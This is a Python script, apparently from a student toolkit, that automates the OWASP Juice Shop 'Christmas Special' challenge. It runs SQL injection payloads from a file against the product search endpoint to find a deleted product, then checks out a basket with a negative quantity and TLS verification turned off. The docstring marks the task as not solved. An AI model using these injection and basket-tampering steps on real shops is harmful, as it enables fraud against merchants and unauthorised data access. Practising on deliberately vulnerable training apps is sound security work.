"""
This file is to automate the OWASP JUICESHOP TASK
CHRISTMAS SPECIAL -- NOT SOLVED (similar to paybacktime)
-------------------------------------------------
Steps:
1. You need to find those deleted products using injection
2. Add those products into your basket
"""

from plugins import attack as a
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from plugins import paybackTime as pt

class Chrismas_special(pt.paybackTime):

    def __init__(self):
        self.juice_session = a.requests.session()
        self.email = self.set_info()
        self.cookie, self.header = a.get_auth(self.email)
        self.basketId = a.get_basket_id(self.email)
        self.productId = self.get_product()
        self.address_url = a.URL + '/api/Addresss/'
        self.checkout_url = a.URL + '/rest/basket/'+str(self.basketId)+'/checkout'

    def set_info(self):
        print("please enter a customer user's email")
        email = input()
        return email

    def generator(self):
        pass

    def get_product(self):
        f = open('plugins/SQL_injection_payloads.txt', 'r')
        while True:
            line = f.readline()
            if line:
                payload = a.URL + "/rest/products/search?q=" + line[:-1]
                response = self.juice_session.get(payload)
                if response.status_code == 200:
                    data_list = response.json()["data"]
                    for i in range(len(data_list)):
                        if "Christmas" in data_list[i]["name"]:
                            return data_list[i]["id"]
            else:
                break
        f.close()

    def run(self):
        super().addto_basket(quantity=-5, productId=self.productId)
        json_data = super().generator()
        response = self.juice_session.post(self.checkout_url, cookies=self.cookie, headers=self.header, json=json_data,
                                           verify=False)
        print(response.text)







